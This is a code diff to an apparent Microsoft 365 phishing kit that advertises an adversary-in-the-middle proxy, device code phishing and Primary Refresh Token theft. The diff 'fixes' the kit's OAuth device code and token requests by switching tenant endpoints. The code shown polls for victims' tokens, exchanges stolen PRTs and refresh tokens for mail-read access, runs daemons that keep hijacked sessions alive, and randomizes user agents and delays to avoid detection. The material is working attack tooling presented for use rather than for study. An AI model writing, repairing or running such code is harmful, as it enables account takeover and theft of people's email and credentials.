@@ -3,7 +3,7 @@
 // ============================================================
 // 🔥 FEATURES:
 //   ✅ AiTM Reverse Proxy with session tracking
-//   ✅ Device Code Phishing (OAuth device flow)
+//   ✅ Device Code Phishing (OAuth device flow) — FIXED
 //   ✅ PRT (Primary Refresh Token) Exchange & Storage
 //   ✅ PRT Auto-Scan from logs
 //   ✅ PRT Health Checking
@@ -1110,7 +1110,7 @@ dashApp.post('/api/device/manual', async (req, res) => {
         const code = user_code || device_code;
         const DEVICE_CLIENT_ID = '9e5f94bc-e8a4-4e73-b8be-63364c29d753';
         const response = await axios.post(
-            'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
+            'https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode',
             new URLSearchParams({
                 client_id: DEVICE_CLIENT_ID,
                 scope: 'https://graph.microsoft.com/user.read https://graph.microsoft.com/mail.read offline_access'
@@ -1175,7 +1175,7 @@ dashApp.post('/api/prt/exchange', async (req, res) => {
     try {
         console.log('🔄 Exchanging PRT for tokens...');
         const response = await axios.post(
-            'https://login.microsoftonline.com/common/oauth2/v2.0/token',
+            'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
             new URLSearchParams({
                 client_id: client_id,
                 grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
@@ -1945,7 +1945,7 @@ function scanAllLogsForPRTs() {
 async function checkPRTHealth(prt) {
     try {
         const response = await axios.post(
-            'https://login.microsoftonline.com/common/oauth2/v2.0/token',
+            'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
             new URLSearchParams({
                 client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
                 grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
@@ -2022,7 +2022,7 @@ dashApp.post('/api/prt/exchange-all', async (req, res) => {
         for (const item of prts) {
             try {
                 const response = await axios.post(
-                    'https://login.microsoftonline.com/common/oauth2/v2.0/token',
+                    'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
                     new URLSearchParams({
                         client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
                         grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
@@ -2068,7 +2068,7 @@ async function prtRefreshDaemon() {
         for (const item of prts) {
             try {
                 const response = await axios.post(
-                    'https://login.microsoftonline.com/common/oauth2/v2.0/token',
+                    'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
                     new URLSearchParams({
                         client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
                         grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
@@ -2555,7 +2555,7 @@ app.get('/mfa', (req, res) => {
     `);
 });
 
-// ── ✅ DEVICE CODE REQUEST ──
+// ── ✅ DEVICE CODE REQUEST (FIXED) ──
 app.post('/device/request', async (req, res) => {
     if (!axios) {
         return res.status(500).json({ error: 'axios not installed' });
@@ -2566,7 +2566,8 @@ app.post('/device/request', async (req, res) => {
         const userAgent = getRandomUserAgent();
         await randomDelay(300, 800);
 
-        const url = 'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode';
+        // ✅ FIXED: Use 'organizations' instead of 'common'
+        const url = 'https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode';
         const params = new URLSearchParams({
             client_id: clientId,
             scope: 'https://graph.microsoft.com/.default offline_access'
@@ -2627,7 +2628,7 @@ app.post('/device/request', async (req, res) => {
     }
 });
 
-// ── ✅ DEVICE TOKEN POLLING ──
+// ── ✅ DEVICE TOKEN POLLING (FIXED) ──
 app.post('/device/token', async (req, res) => {
     if (!axios) {
         return res.status(500).json({ error: 'axios not installed' });
@@ -2643,7 +2644,8 @@ app.post('/device/token', async (req, res) => {
         const userAgent = getRandomUserAgent();
         await randomDelay(200, 600);
 
-        const url = 'https://login.microsoftonline.com/common/oauth2/v2.0/token';
+        // ✅ FIXED: Use 'organizations' instead of 'common'
+        const url = 'https://login.microsoftonline.com/organizations/oauth2/v2.0/token';
         const params = new URLSearchParams({
             client_id: clientId,
             device_code: device_code,
@@ -2746,7 +2748,7 @@ async function refreshTokensDaemon() {
             if (flow.refresh_token && flow.status === 'approved') {
                 try {
                     const response = await axios.post(
-                        'https://login.microsoftonline.com/common/oauth2/v2.0/token',
+                        'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
                         new URLSearchParams({
                             client_id: flow.client_id || '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
                             refresh_token: flow.refresh_token,
